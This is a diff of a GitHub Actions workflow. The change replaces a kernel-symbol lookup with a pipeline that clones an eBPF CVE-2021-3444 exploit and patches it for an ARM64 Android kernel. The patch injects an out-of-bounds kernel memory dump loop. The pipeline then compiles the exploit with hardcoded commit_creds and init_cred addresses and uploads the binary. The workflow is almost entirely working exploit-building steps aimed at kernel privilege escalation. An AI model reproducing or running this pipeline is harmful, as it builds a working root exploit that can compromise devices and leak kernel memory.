@@ -1,28 +1,48 @@
-name: find_ops_offset
+name: ebpf_mem_dump
 on: [push, workflow_dispatch]
 
 jobs:
-  find:
-    runs-on: ubuntu-latest
+  build:
+    runs-on: ubuntu-24.04-arm
     steps:
-      - name: Checkout M36-TempRoot
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      - name: Prepare kernel.elf
+      - name: Install dependencies
         run: |
-          unzip boot_a.zip
-          git clone https://android.googlesource.com/platform/system/tools/mkbootimg
-          PYTHONPATH=mkbootimg python3 mkbootimg/unpack_bootimg.py --boot_img boot_a.img --out boot_unpacked
-          cd boot_unpacked
-          cp kernel kernel_raw.gz && gunzip kernel_raw.gz
-          pip3 install vmlinux-to-elf
-          vmlinux-to-elf kernel_raw kernel.elf
+          sudo apt-get update -y
+          sudo apt-get install -y gcc make git
 
-      - name: Install binutils
-        run: sudo apt-get update && sudo apt-get install -y binutils-aarch64-linux-gnu
-
-      - name: Find where array_map_ops is written
+      - name: Clone and patch exploit
         run: |
-          cd boot_unpacked
-          echo "=== Looking for array_map_ops address (ffffff8008f5d500) ==="
-          aarch64-linux-gnu-objdump -d kernel.elf | grep -B 3 -A 3 "ffffff8008f5d500" | head -n 40
+          git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
+          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
+          
+          # Fix sizes for ARM64
+          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
+          sed -i 's|#define BPF_ARRAY_VALUE_OFFSET 208|#define BPF_ARRAY_VALUE_OFFSET 0x140|' exploit.c
+          
+          # Add a memory dump loop right after the initial leak
+          sed -i 's|uint64_t leaked_ops = do_oob_read_at(victim_fd, result_fd, OPS_OFFSET);|uint64_t leaked_ops = do_oob_read_at(victim_fd, result_fd, OPS_OFFSET); for(int _d=320; _d<=2048; _d+=8){uint64_t _v = do_oob_read_at(victim_fd, result_fd, _d); if(_v!=0) printf("  DUMP[%4d]=0x%016lx\\n", _d, _v);}|' exploit.c
+          
+          echo "=== Verification ==="
+          grep -E "KERNEL_BASE|BPF_ARRAY_VALUE_OFFSET" exploit.c
+          grep -c "DUMP" exploit.c
+
+      - name: Compile
+        run: |
+          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
+          gcc -static -O2 -I ../../../common/include \
+            -DDYN_ARRAY_MAP_OPS=0xffffff8008f5d500ULL \
+            -DDYN_ARRAY_OF_MAPS_MAP_OPS=0xffffff8008f5d780ULL \
+            -DDYN_FD_ARRAY_MAP_DELETE_ELEM=0xffffff80081d6cecULL \
+            -DDYN_COMMIT_CREDS=0xffffff80080e03dcULL \
+            -DDYN_INIT_CRED=0xffffff8009787f48ULL \
+            exploit.c -o exploit
+          
+          file exploit
+          ls -la exploit
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: ebpf-mem-dump
+          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit
